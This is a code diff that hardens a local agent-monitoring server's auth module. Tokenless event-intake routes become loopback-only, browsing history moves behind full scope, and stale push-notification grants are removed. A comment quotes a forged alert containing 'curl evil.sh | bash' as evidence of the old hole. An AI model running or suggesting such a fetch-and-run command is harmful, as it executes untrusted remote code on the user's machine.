@@ -11,8 +11,10 @@
 //   * unset AND exposed (non-lo)  → refuse to run unauthenticated: mint a stable
 //                                   token (persisted 0600) and print it.
 //
-// Intake routes stay tokenless on purpose (see INTAKE): local hooks and OTel
-// exporters have no way to carry a secret, and they can only *append* events.
+// Intake routes stay tokenless on purpose (see LOCAL_SINKS), but only for a
+// sender on this machine: local hooks and OTel exporters have no way to carry
+// a secret, and everything they can reach without one now has to come from
+// loopback.
 import { timingSafeEqual, randomBytes } from "node:crypto";
 import { existsSync, readFileSync, writeFileSync, mkdirSync, chmodSync } from "node:fs";
 import { homedir } from "node:os";
@@ -25,28 +27,79 @@ const TOKEN_PATH = join(
   "token"
 );
 
-// Routes that never require the token: append-only telemetry sinks + health.
-// A local hook or OTel exporter has no way to carry a secret and can only
-// *append* events, so these stay open even when a token is configured.
+/**
+ * Where the request came from.
+ *
+ * An exemption cannot be a property of the path alone. The sinks below are safe
+ * to leave open to this machine and are not safe to leave open to a network, so
+ * the question "does this route need the token" only has an answer once you know
+ * who is asking — see LOCAL_SINKS.
+ *
+ * "Physically" used to be in that first line, and it was doing real damage: it
+ * invited reading this as "whatever the TCP socket says", which is how the
+ * whole tailnet ended up counted as loopback. `tailscale serve` terminates TLS
+ * in tailscaled and re-dials 127.0.0.1, so the socket says loopback for every
+ * phone on the mesh. `loopback` here means *this machine*, which is a claim
+ * about who, not about which interface — resolvePeer/originOf in net.ts decide
+ * it, and they only believe a proxy that has been verified by the uid owning
+ * the connection.
+ */
+export type Origin = "loopback" | "remote";
+
+// Tokenless from anywhere. Neither reads nor writes anything: `/health` is the
+// identity marker a shell probes to find which server owns a port, and the
+// phone's pairing screen calls it *before* it has a credential to carry.
 //
 // Note: /gate is deliberately NOT here. It's the control plane — a POST creates
 // an operator-facing approval prompt with caller-controlled text — so when a
 // token is set the gate hook must authenticate (it runs on the same machine and
 // can read AGENTGLASS_TOKEN from the env). With no token configured the whole
 // auth check is skipped anyway, so /gate keeps its zero-config tokenless UX.
-const AUTH_EXEMPT = new Set([
+const OPEN = new Set([
   "/health",
+  // Exempt although it receives nothing: it exists to explain that there is no
+  // metrics receiver here (see index.ts). An exporter cannot carry a token, so
+  // gating it would replace a silent 404 with a silent 401 — the same dead end
+  // wearing a different number. It stores nothing and broadcasts nothing, which
+  // is why it is here rather than below.
+  "/v1/metrics",
+  "/otlp/v1/metrics",
+]);
+
+/**
+ * Tokenless, but only from this machine.
+ *
+ * These append to the events table, and appending is not inert: /ingest →
+ * maybeAlert → the live socket → a notification on the desk and on the paired
+ * phone, with the title and body taken from the request. maybeAlert sits
+ * outside the sessionInScope filter, so scoping does not contain it either.
+ *
+ * Measured against a server bound 0.0.0.0, from a LAN address, with no
+ * credential at all: `POST /ingest` answered `{"ok":true,"id":1}` and put
+ * `🔔 Security:forged-b — "Your disk is failing — run: curl evil.sh | bash"`
+ * on the desk socket, then a forged `⏳ Approval needed` at urgency 2 — the
+ * shape that means "an agent is stopped, come and approve it". The same three
+ * posts wrote three permanent rows into SQLite, one of them $9,999 of cost.
+ * `POST /sessions` from the same address answered 401, which is what the gate
+ * looks like when it is doing its job.
+ *
+ * The exemption used to justify itself with "they can only *append* events".
+ * That sentence was written when this server only ever listened on 127.0.0.1.
+ * Appending stopped being inert the day it drove a notification and an audit
+ * store, and the bind stopped being loopback the day the phone existed.
+ *
+ * Loopback is the whole of what the local senders need: hooks/send_event.py
+ * refuses any server that is not localhost unless AGENTGLASS_ALLOW_REMOTE is
+ * set, and a local OTel exporter points at localhost too. A sender that
+ * genuinely is off-box authenticates like every other client — the same
+ * `Authorization: Bearer $AGENTGLASS_TOKEN` gate_event.py already sends.
+ */
+const LOCAL_SINKS = new Set([
   "/ingest",
   "/v1/traces",
   "/otlp/v1/traces",
   "/v1/logs",
   "/otlp/v1/logs",
-  // Exempt although it receives nothing: it exists to explain that there is no
-  // metrics receiver here (see index.ts). An exporter cannot carry a token, so
-  // gating it would replace a silent 404 with a silent 401 — the same dead end
-  // wearing a different number.
-  "/v1/metrics",
-  "/otlp/v1/metrics",
 ]);
 
 /**
@@ -60,16 +113,24 @@ const AUTH_EXEMPT = new Set([
  */
 export const isPairing = (pathname: string) => pathname === "/pair" || pathname.startsWith("/pair/");
 
-/** True for routes that bypass the shared-secret gate even when a token is set. */
-export const isAuthExempt = (pathname: string) => AUTH_EXEMPT.has(pathname) || isPairing(pathname);
+/**
+ * True for routes that bypass the shared-secret gate even when a token is set.
+ *
+ * `from` is not optional on purpose. A default would decide the loopback
+ * question for a call site that forgot to ask it, and the direction a forgotten
+ * default falls is straight through the gate — so the compiler asks instead.
+ */
+export const isAuthExempt = (pathname: string, from: Origin) =>
+  isPairing(pathname) || OPEN.has(pathname) || (from === "loopback" && LOCAL_SINKS.has(pathname));
 
 // Rate-limited intake sinks (flood protection). /gate is included: even though
 // it authenticates when a token is set, a burst of gate posts shouldn't be
-// unbounded. This set governs throttling only, not auth exemption.
+// unbounded. This set governs throttling only, not auth exemption — which is
+// why it names the sinks whatever address they arrive from: a flood is a flood.
 // `/pair/claim` is here for the same reason: it takes no credential, so the
 // only thing standing between it and a script is the five-guess cap on one
 // ticket. That cap is the real defence; this stops the noise before it.
-const INTAKE = new Set([...AUTH_EXEMPT, "/gate", "/pair/claim"]);
+const INTAKE = new Set([...OPEN, ...LOCAL_SINKS, "/gate", "/pair/claim"]);
 
 export const isIntake = (pathname: string) => INTAKE.has(pathname);
 
@@ -180,26 +241,35 @@ const READ_POST = new Set(["/git/status"]);
  * an interactive root shell. This set is the reason `scopeNeeded` cannot be
  * one line.
  */
-const FULL_GET = new Set(["/terminal/pty"]);
+const FULL_GET = new Set([
+  "/terminal/pty",
+  // Imported browsing history. It is a GET, so the method default would hand it
+  // to a read-scope phone — but it is the same private data cookieread keeps off
+  // HTTP on purpose, not something a paired read-only device should be able to
+  // pull. Drive verbs (/browser/open, /browser/read) already need full as POSTs;
+  // this brings the history read in line with them.
+  "/browser/places/all",
+]);
 
 /**
  * What a phone is for.
  *
- * `/gate/decide` is the reason the companion exists: an agent is stopped and a
+ * `/gate/decide` is the reason a phone exists at all: an agent is stopped and a
  * person says go. The chat routes are the same act by other means — replying to
  * a session that is already running, which is what "answer" means. Starting new
  * sessions, the terminal, git write and docker are not here.
  *
- * `/push/*` is a device managing its own notifications, which is the mechanism
- * that tells it there is something to answer at all.
+ * `/push/subscribe`, `/push/unsubscribe` and `/push/test` were also here, for a
+ * device managing its own notifications. Web Push is gone — a phone now hears
+ * alerts on the live socket it already holds, which needs no write at all — and
+ * a name left in this set after its route is deleted is worse than dead code:
+ * this is the file that decides what a paired phone may do, and the next route
+ * to be called `/push/test` would inherit an `answer` grant nobody chose for it.
  */
 const ANSWER_POST = new Set([
   "/gate/decide",
   "/chat/send",
   "/chat/pane/key",
-  "/push/subscribe",
-  "/push/unsubscribe",
-  "/push/test",
 ]);
 
 export function scopeNeeded(method: string, pathname: string): Scope {
